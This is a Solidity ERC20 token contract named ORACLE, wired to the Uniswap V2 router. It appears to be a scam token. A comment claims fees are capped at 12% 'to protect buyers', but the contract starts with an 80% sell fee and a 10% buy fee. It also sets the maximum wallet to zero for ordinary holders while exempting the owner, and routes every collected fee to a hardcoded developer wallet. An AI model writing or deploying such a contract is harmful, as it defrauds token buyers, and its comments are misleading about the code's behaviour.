1 // SPDX-License-Identifier: Unlicensed
2 
3 
4 pragma solidity ^0.8.7;
5 
6 interface IERC20 {
7     
8     function totalSupply() external view returns (uint256);
9     function balanceOf(address account) external view returns (uint256);
10     function transfer(address recipient, uint256 amount) external returns (bool);
11     function allowance(address owner, address spender) external view returns (uint256);
12     function approve(address spender, uint256 amount) external returns (bool);
13     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
14     event Transfer(address indexed from, address indexed to, uint256 value);
15     event Approval(address indexed owner, address indexed spender, uint256 value);
16 }
17 
18 library SafeMath {
19     
20     function add(uint256 a, uint256 b) internal pure returns (uint256) {
21         return a + b;
22     }
23 
24     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
25         return a - b;
26     }
27 
28     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
29         return a * b;
30     }
31     
32     function div(uint256 a, uint256 b) internal pure returns (uint256) {
33         return a / b;
34     }
35 
36     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
37         unchecked {
38             require(b <= a, errorMessage);
39             return a - b;
40         }
41     }
42     
43     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
44         unchecked {
45             require(b > 0, errorMessage);
46             return a / b;
47         }
48     }
49 }
50 
51 
52 
53 abstract contract Context {
54     function _msgSender() internal view virtual returns (address) {
55         return msg.sender;
56     }
57 
58     function _msgData() internal view virtual returns (bytes calldata) {
59         this; 
60         return msg.data;
61     }
62 }
63 
64 
65 library Address {
66     
67     function isContract(address account) internal view returns (bool) {
68         uint256 size;
69         assembly { size := extcodesize(account) }
70         return size > 0;
71     }
72 
73     function sendValue(address payable recipient, uint256 amount) internal {
74         require(address(this).balance >= amount, "Address: insufficient balance");
75         (bool success, ) = recipient.call{ value: amount }("");
76         require(success, "Address: unable to send value, recipient may have reverted");
77     }
78     
79     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
80       return functionCall(target, data, "Address: low-level call failed");
81     }
82     
83     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
84         return functionCallWithValue(target, data, 0, errorMessage);
85     }
86     
87     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
88         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
89     }
90     
91     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
92         require(address(this).balance >= value, "Address: insufficient balance for call");
93         require(isContract(target), "Address: call to non-contract");
94         (bool success, bytes memory returndata) = target.call{ value: value }(data);
95         return _verifyCallResult(success, returndata, errorMessage);
96     }
97     
98     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
99         return functionStaticCall(target, data, "Address: low-level static call failed");
100     }
101     
102     function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
103         require(isContract(target), "Address: static call to non-contract");
104         (bool success, bytes memory returndata) = target.staticcall(data);
105         return _verifyCallResult(success, returndata, errorMessage);
106     }
107 
108 
109     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
110         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
111     }
112     
113     function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
114         require(isContract(target), "Address: delegate call to non-contract");
115         (bool success, bytes memory returndata) = target.delegatecall(data);
116         return _verifyCallResult(success, returndata, errorMessage);
117     }
118 
119     function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
120         if (success) {
121             return returndata;
122         } else {
123             if (returndata.length > 0) {
124                  assembly {
125                     let returndata_size := mload(returndata)
126                     revert(add(32, returndata), returndata_size)
127                 }
128             } else {
129                 revert(errorMessage);
130             }
131         }
132     }
133 }
134 
135 
136 abstract contract Ownable is Context {
137     address private _owner;
138 
139     // Set original owner
140     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
141     constructor () {
142         _owner = 0x9428481F22Ce025B81e6E7265808feD2935E0BA4;
143         emit OwnershipTransferred(address(0), _owner);
144     }
145 
146     // Return current owner
147     function owner() public view virtual returns (address) {
148         return _owner;
149     }
150 
151     // Restrict function to contract owner only 
152     modifier onlyOwner() {
153         require(owner() == _msgSender(), "Ownable: caller is not the owner");
154         _;
155     }
156 
157     // Renounce ownership of the contract 
158     function renounceOwnership() public virtual onlyOwner {
159         emit OwnershipTransferred(_owner, address(0));
160         _owner = address(0);
161     }
162 
163     // Transfer the contract to to a new owner
164     function transferOwnership(address newOwner) public virtual onlyOwner {
165         require(newOwner != address(0), "Ownable: new owner is the zero address");
166         emit OwnershipTransferred(_owner, newOwner);
167         _owner = newOwner;
168     }
169 }
170 
171 interface IUniswapV2Factory {
172     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
173     function feeTo() external view returns (address);
174     function feeToSetter() external view returns (address);
175     function getPair(address tokenA, address tokenB) external view returns (address pair);
176     function allPairs(uint) external view returns (address pair);
177     function allPairsLength() external view returns (uint);
178     function createPair(address tokenA, address tokenB) external returns (address pair);
179     function setFeeTo(address) external;
180     function setFeeToSetter(address) external;
181 }
182 
183 interface IUniswapV2Pair {
184     event Approval(address indexed owner, address indexed spender, uint value);
185     event Transfer(address indexed from, address indexed to, uint value);
186     function name() external pure returns (string memory);
187     function symbol() external pure returns (string memory);
188     function decimals() external pure returns (uint8);
189     function totalSupply() external view returns (uint);
190     function balanceOf(address owner) external view returns (uint);
191     function allowance(address owner, address spender) external view returns (uint);
192     function approve(address spender, uint value) external returns (bool);
193     function transfer(address to, uint value) external returns (bool);
194     function transferFrom(address from, address to, uint value) external returns (bool);
195     function DOMAIN_SEPARATOR() external view returns (bytes32);
196     function PERMIT_TYPEHASH() external pure returns (bytes32);
197     function nonces(address owner) external view returns (uint);
198     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
199     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
200     event Swap(
201         address indexed sender,
202         uint amount0In,
203         uint amount1In,
204         uint amount0Out,
205         uint amount1Out,
206         address indexed to
207     );
208     event Sync(uint112 reserve0, uint112 reserve1);
209     function MINIMUM_LIQUIDITY() external pure returns (uint);
210     function factory() external view returns (address);
211     function token0() external view returns (address);
212     function token1() external view returns (address);
213     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
214     function price0CumulativeLast() external view returns (uint);
215     function price1CumulativeLast() external view returns (uint);
216     function kLast() external view returns (uint);
217     function burn(address to) external returns (uint amount0, uint amount1);
218     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
219     function skim(address to) external;
220     function sync() external;
221     function initialize(address, address) external;
222 }
223 
224 interface IUniswapV2Router01 {
225     function factory() external pure returns (address);
226     function WETH() external pure returns (address);
227     function addLiquidityETH(
228         address token,
229         uint amountTokenDesired,
230         uint amountTokenMin,
231         uint amountETHMin,
232         address to,
233         uint deadline
234     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
235 
236 
237     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
238     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
239     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
240     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
241     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
242 }
243 
244 interface IUniswapV2Router02 is IUniswapV2Router01 {
245     function swapExactTokensForETHSupportingFeeOnTransferTokens(
246         uint amountIn,
247         uint amountOutMin,
248         address[] calldata path,
249         address to,
250         uint deadline
251     ) external;
252 }
253 
254 
255 contract Oracle is Context, IERC20, Ownable { 
256     using SafeMath for uint256;
257     using Address for address;
258 
259 
260     // Tracking status of wallets
261     mapping (address => uint256) private _tOwned;
262     mapping (address => mapping (address => uint256)) private _allowances;
263     mapping (address => bool) public _isExcludedFromFee; 
264 
265     /*
266      * Development and burn wallet WALLETS
267      */
268 
269     address payable private Wallet_Dev = payable(0x9428481F22Ce025B81e6E7265808feD2935E0BA4);
270     address payable private Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
271 
272     /*
273      * TOKEN DETAILS
274      */
275 
276     string private _name = "ORACLE"; 
277     string private _symbol = "ORACLE";  
278     uint8 private _decimals = 9;
279     uint256 private _tTotal = 210_000_000 * 10**_decimals;
280     uint256 private _tFeeTotal;
281 
282     // Counter for liquify trigger
283     uint8 private txCount = 0;
284     uint8 private swapTrigger = 2; 
285     
286     // This is the max fee that the contract will accept, it is hard-coded to protect buyers
287     // This includes the buy AND the sell fee!
288     uint256 public maxPossibleFee = 12; 
289 
290     // Setting the initial fees
291     uint256 private _TotalFee = 100;
292     uint256 public _buyFee = 10;
293     uint256 public _sellFee = 80;
294 
295     // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
296     uint256 private _previousTotalFee = _TotalFee; 
297     uint256 private _previousBuyFee = _buyFee; 
298     uint256 private _previousSellFee = _sellFee; 
299 
300     /*
301      *WALLET LIMITS 
302     */
303 
304     uint256 public _maxWalletToken = 0 * (10 **_decimals);//0%
305     uint256 private _previousMaxWalletToken = _maxWalletToken;
306     /* 
307      PANCAKESWAP SET UP
308     */
309                                      
310     IUniswapV2Router02 public uniswapV2Router;
311     address public uniswapV2Pair;
312     bool public inSwapAndLiquify;
313     bool public swapAndLiquifyEnabled = true;
314     
315     event SwapAndLiquifyEnabledUpdated(bool enabled);
316     event SwapAndLiquify(
317         uint256 tokensSwapped,
318         uint256 ethReceived,
319         uint256 tokensIntoLiqudity
320         
321     );
322     
323     // Prevent processing while already processing! 
324     modifier lockTheSwap {
325         inSwapAndLiquify = true;
326         _;
327         inSwapAndLiquify = false;
328     }
329     
330     constructor () {
331         _tOwned[owner()] = _tTotal;
332         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
333         //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D - Uniswap v2 router - mainnet
334 
335         // Create pair address for PancakeSwap
336         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
337         uniswapV2Router = _uniswapV2Router;
338         _isExcludedFromFee[owner()] = true;
339         _isExcludedFromFee[address(this)] = true;
340         _isExcludedFromFee[Wallet_Dev] = true;
341         
342         emit Transfer(address(0), owner(), _tTotal);
343     }
344 
345     /*
346     * STANDARD ERC20 COMPLIANCE FUNCTIONS
347     */
348 
349     function name() public view returns (string memory) {
350         return _name;
351     }
352 
353     function symbol() public view returns (string memory) {
354         return _symbol;
355     }
356 
357     function decimals() public view returns (uint8) {
358         return _decimals;
359     }
360 
361     function totalSupply() public view override returns (uint256) {
362         return _tTotal;
363     }
364 
365     function balanceOf(address account) public view override returns (uint256) {
366         return _tOwned[account];
367     }
368 
369     function transfer(address recipient, uint256 amount) public override returns (bool) {
370         _transfer(_msgSender(), recipient, amount);
371         return true;
372     }
373 
374     function allowance(address owner, address spender) public view override returns (uint256) {
375         return _allowances[owner][spender];
376     }
377 
378     function approve(address spender, uint256 amount) public override returns (bool) {
379         _approve(_msgSender(), spender, amount);
380         return true;
381     }
382 
383     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
384         _transfer(sender, recipient, amount);
385         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
386         return true;
387     }
388 
389     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
390         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
391         return true;
392     }
393 
394     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
395         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
396         return true;
397     }
398 
399 
400     /*
401      * END OF STANDARD ERC20 COMPLIANCE FUNCTIONS
402     */
403 
404 
405     /*
406      *   FEES
407     */
408     
409     // Excludes marketing wallet or volume wallet from tax
410     function excludeFromFee(address account) public onlyOwner {
411         _isExcludedFromFee[account] = true;
412     }
413     
414     // Set a wallet address so that it has to pay transaction fees
415     function includeInFee(address account) public onlyOwner {
416         _isExcludedFromFee[account] = false;
417     }
418 
419     //Good for stealth launch, changes from temp to the final name
420     function set_Token_Bio_For_Stealth_Launch(string memory newName, string memory newSymbol) public onlyOwner() {
421         _name = newName;
422         _symbol = newSymbol;
423     }
424 
425     function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
426         require((Buy_Fee + Sell_Fee) <= maxPossibleFee, "Cannot increase above 12%.");
427         _sellFee = Sell_Fee;
428         _buyFee = Buy_Fee;
429 
430     }
431 
432     // Update main wallet
433     function Wallet_Update_Dev(address payable wallet) public onlyOwner() {
434         Wallet_Dev = wallet;
435         _isExcludedFromFee[Wallet_Dev] = true;
436     }
437 
438     function set_Swap_And_Liquify_Enabled(bool true_or_false) public onlyOwner {
439         swapAndLiquifyEnabled = true_or_false;
440         emit SwapAndLiquifyEnabledUpdated(true_or_false);
441     }
442 
443     // This will set the number of transactions required before the 'swapAndLiquify' function triggers
444     function set_Number_Of_Transactions_Before_Liquify_Trigger(uint8 number_of_transactions) public onlyOwner {
445         swapTrigger = number_of_transactions;
446     }
447     
448 
449     // This function is required so that the contract can receive BNB from pancakeswap
450     receive() external payable {}
451 
452     bool public noFeeToTransfer = true;
453     function set_Transfers_Without_Fees(bool true_or_false) external onlyOwner {
454         noFeeToTransfer = true_or_false;
455     } 
456     
457     // Set the maximum wallet holding (percent of total supply)
458      function set_Max_Wallet_Percent(uint256 maxWallHolidng) external onlyOwner() {
459         _maxWalletToken = maxWallHolidng * (10**_decimals);
460     }
461 
462     // Remove all fees
463     function removeAllFee() private {
464         if(_TotalFee == 0 && _buyFee == 0 && _sellFee == 0) return;
465 
466         _previousBuyFee = _buyFee; 
467         _previousSellFee = _sellFee; 
468         _previousTotalFee = _TotalFee;
469         _buyFee = 0;
470         _sellFee = 0;
471         _TotalFee = 0;
472 
473     }
474     
475     // Restore all fees
476     function restoreAllFee() private {
477     
478     _TotalFee = _previousTotalFee;
479     _buyFee = _previousBuyFee; 
480     _sellFee = _previousSellFee; 
481 
482     }
483 
484 
485     // Approve a wallet to sell tokens
486     function _approve(address owner, address spender, uint256 amount) private {
487 
488         require(owner != address(0) && spender != address(0), "ERR: zero address");
489         _allowances[owner][spender] = amount;
490         emit Approval(owner, spender, amount);
491 
492     }
493 
494     function _transfer(
495         address from,
496         address to,
497         uint256 amount
498     ) private {
499         
500         /*
501          * TRANSACTION AND WALLET LIMITS
502          */
503         
504         // Limit wallet total
505         if (to != owner() &&
506             to != Wallet_Dev &&
507             to != address(this) &&
508             to != uniswapV2Pair &&
509             to != Wallet_Burn &&
510             from != owner()){
511 
512             uint256 heldTokens = balanceOf(to);
513             require((heldTokens + amount) <= _maxWalletToken,"Maximum wallet limited has been exceeded");       
514         }
515 
516         require(from != address(0) && to != address(0), "ERR: Using 0 address!");
517         require(amount > 0, "Token value must be higher than zero.");
518 
519         /*
520 
521         PROCESSING
522 
523         */
524 
525         if(
526             txCount >= swapTrigger && 
527             !inSwapAndLiquify &&
528             from != uniswapV2Pair &&
529             swapAndLiquifyEnabled 
530             )
531         {  
532             txCount = 0;
533             uint256 contractTokenBalance = balanceOf(address(this));
534             if(contractTokenBalance > 0){
535             swapAndLiquify(contractTokenBalance);
536            }
537         }
538 
539         
540         bool takeFee = true;
541          
542         if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
543             takeFee = false;
544         } else if (from == uniswapV2Pair){
545             _TotalFee = _buyFee;
546         } else if (to == uniswapV2Pair){
547             _TotalFee = _sellFee;
548         }
549 
550         _tokenTransfer(from,to,amount,takeFee);
551     }
552 
553 
554     // Send BNB to external wallet
555     function sendToWallet(address payable wallet, uint256 amount) private {
556             wallet.transfer(amount);
557         }
558 
559 
560     // Processing tokens from contract
561     function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
562         
563         swapTokensForBNB(contractTokenBalance);
564         uint256 contractBNB = address(this).balance;
565         sendToWallet(Wallet_Dev,contractBNB);
566     }
567 
568     // Swapping tokens for BNB using PancakeSwap 
569     function swapTokensForBNB(uint256 tokenAmount) private {
570 
571         address[] memory path = new address[](2);
572         path[0] = address(this);
573         path[1] = uniswapV2Router.WETH();
574         _approve(address(this), address(uniswapV2Router), tokenAmount);
575         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
576             tokenAmount,
577             0, 
578             path,
579             address(this),
580             block.timestamp
581         );
582     }
583 
584     // Check if token transfer needs to process fees
585     function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
586             
587         if(!takeFee){
588             removeAllFee();
589             } else {
590                 txCount++;
591             }
592         _transferTokens(sender, recipient, amount);
593         
594         if(!takeFee)
595             restoreAllFee();
596     }
597 
598     // Redistributing tokens and adding the fee to the contract address
599     function _transferTokens(address sender, address recipient, uint256 tAmount) private {
600         
601         (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);
602         _tOwned[sender] = _tOwned[sender].sub(tAmount);
603         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
604         _tOwned[address(this)] = _tOwned[address(this)].add(tDev);   
605         emit Transfer(sender, recipient, tTransferAmount);
606     }
607 
608 
609     // Calculating the fee in tokens
610     function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
611         uint256 tDev = tAmount.mul(_TotalFee).div(100);
612         uint256 tTransferAmount = tAmount.sub(tDev);
613         return (tTransferAmount, tDev);
614     }
615 }